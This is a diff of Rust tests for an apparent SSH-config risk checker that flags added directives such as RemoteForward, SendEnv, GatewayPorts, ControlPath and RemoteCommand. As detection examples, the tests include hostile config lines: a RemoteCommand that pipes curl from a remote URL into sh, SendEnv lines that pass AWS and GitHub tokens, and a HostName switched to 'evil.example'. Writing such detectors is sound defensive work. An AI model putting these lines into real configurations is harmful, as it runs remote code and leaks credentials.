@@ -604,6 +604,8 @@ fn finds_directives_that_run_code() {
             s(&host, "forwardagent", "yes"),
             s(&host, "ForwardX11Trusted", "yes"),
             s(&host, "XAuthLocation", "/opt/X11/bin/xauth"),
+            // On every server the block applies to.
+            s(&host, "RemoteCommand", "tmux attach"),
             // Where the agent and display above go.
             s(&host, "User", "me"),
             s(
@@ -658,6 +660,7 @@ fn every_spelling_ssh_accepts_counts() {
             "RemoteForward /tmp/a.sock ${SSH_AUTH_SOCK}",
             "RemoteForward 2375 /var/run/docker.sock",
             "RemoteForward 1080",
+            "RemoteForward 8080 localhost:3000",
             // Not a command: where the forwards above go.
             "\"HostName\" example.com",
         ]
@@ -895,10 +898,6 @@ fn remote_forward_with_an_empty_target_is_dynamic() {
             "{line}"
         );
     }
-    assert_eq!(
-        added("Host a\n", "Host a\n  RemoteForward 8080 localhost:3000\n"),
-        NOTHING
-    );
     // Through the host editor too.
     let before = SshConfig::parse("Host prod\n  HostName prod.example\n");
     let mut after = before.clone();
@@ -1111,6 +1110,154 @@ fn checking_servers_less_strictly_asks() {
     ] {
         assert_eq!(added(base, &format!("{base}  {same}\n")), NOTHING, "{same}");
     }
+}
+
+#[test]
+fn forwards_to_this_computer_ask() {
+    // The server reaches a port of this computer, or of its network.
+    for line in [
+        "RemoteForward 2222 localhost:22",
+        "RemoteForward 6379 127.0.0.1:6379",
+        "RemoteForward [::1]:8080 intranet.example:80",
+    ] {
+        assert_eq!(
+            added_risks("Host a\n", &format!("Host a\n  {line}\n")),
+            [s(Risk::ServerAccess, &format!("Host a | {line}"))],
+            "{line}"
+        );
+    }
+}
+
+#[test]
+fn sending_the_environment_asks() {
+    for line in [
+        "SendEnv *",
+        "SendEnv AWS_* GITHUB_TOKEN",
+        "SendEnv LANG LC_* SECRET",
+        "SendEnv \"*\"",
+    ] {
+        assert_eq!(
+            added_risks("Host a\n", &format!("Host a\n  {line}\n")),
+            [s(Risk::ServerAccess, &format!("Host a | {line}"))],
+            "{line}"
+        );
+    }
+    // The locale, as distributions send it, and taking names off the list.
+    for line in [
+        "SendEnv LANG LC_*",
+        "SendEnv LANG LC_* COLORTERM NO_COLOR",
+        "SendEnv LANGUAGE LC_ALL",
+        "SendEnv -AWS_*",
+    ] {
+        assert_eq!(
+            added("Host a\n", &format!("Host a\n  {line}\n")),
+            NOTHING,
+            "{line}"
+        );
+    }
+    // Pointing a block that sends the environment at another server asks
+    // too, as for a forwarded agent.
+    let base = "Host work\n  HostName work.corp\n  SendEnv *\n";
+    assert_eq!(
+        added_risks(base, &base.replace("work.corp", "evil.example")),
+        [s(Risk::Destination, "Host work | HostName evil.example")]
+    );
+}
+
+#[test]
+fn listening_for_others_asks() {
+    for line in [
+        "GatewayPorts yes",
+        "GatewayPorts clientspecified",
+        "LocalForward *:8080 intranet.example:80",
+        "LocalForward :8080 intranet.example:80",
+        "LocalForward 0.0.0.0:8080 intranet.example:80",
+        "LocalForward 192.168.1.5:8080 intranet.example:80",
+        "LocalForward [::]:8080 intranet.example:80",
+        // `ssh` joins the two words with `:`.
+        "LocalForward 0.0.0.0 8080:intranet.example:80",
+        "LocalForward * 8080:intranet.example:80",
+        // A variable is filled in before the spec is read.
+        "LocalForward ${DISPLAY}8080 intranet.example:80",
+        "DynamicForward ${DISPLAY}1080",
+        "LocalForward \"*:8080\" intranet.example:80",
+        "LocalForward \\*:8080 intranet.example:80",
+        "DynamicForward 0.0.0.0:1080",
+        "DynamicForward *:1080",
+        "DynamicForward box.lan:1080",
+    ] {
+        assert_eq!(
+            added_risks("Host a\n", &format!("Host a\n  {line}\n")),
+            [s(Risk::Exposed, &format!("Host a | {line}"))],
+            "{line}"
+        );
+    }
+    // On loopback, as by default, or a socket file.
+    for line in [
+        "GatewayPorts no",
+        "LocalForward 8080 intranet.example:80",
+        "LocalForward localhost:8080 intranet.example:80",
+        "LocalForward 127.0.0.1:8080 intranet.example:80",
+        "LocalForward [::1]:8080 intranet.example:80",
+        "LocalForward localhost 8080:intranet.example:80",
+        "LocalForward /tmp/local.sock intranet.example:80",
+        "DynamicForward 1080",
+        "DynamicForward localhost:1080",
+    ] {
+        assert_eq!(
+            added("Host a\n", &format!("Host a\n  {line}\n")),
+            NOTHING,
+            "{line}"
+        );
+    }
+}
+
+#[test]
+fn a_shared_control_socket_asks() {
+    for line in [
+        "ControlPath /tmp/cm-%r@%h:%p",
+        "ControlPath %d/../../tmp/cm",
+        "ControlPath ~/../../tmp/cm",
+        "ControlPath ${XDG_RUNTIME_DIR}/cm-%C",
+        "ControlPath ~other/cm",
+        "ControlPath cm-%C",
+        "ControlPath \"none\" x",
+    ] {
+        assert_eq!(
+            added_risks("Host a\n", &format!("Host a\n  {line}\n")),
+            [s(Risk::Exposed, &format!("Host a | {line}"))],
+            "{line}"
+        );
+    }
+    for line in [
+        "ControlPath none",
+        "ControlPath \"none\"",
+        "ControlPath ~/.ssh/cm-%r@%h:%p",
+        "ControlPath %d/.ssh/cm-%C",
+        "ControlMaster auto",
+        "ControlPersist 10m",
+    ] {
+        assert_eq!(
+            added("Host a\n", &format!("Host a\n  {line}\n")),
+            NOTHING,
+            "{line}"
+        );
+    }
+}
+
+#[test]
+fn a_remote_command_asks() {
+    assert_eq!(
+        added_risks(
+            "Host *\n",
+            "Host *\n  RemoteCommand curl -s https://x.example/p | sh\n"
+        ),
+        [s(
+            Risk::RunsCode,
+            "Host * | RemoteCommand curl -s https://x.example/p | sh"
+        )]
+    );
+    assert_eq!(added("Host a\n", "Host a\n  RemoteCommand none\n"), NOTHING);
 }
 
 #[test]
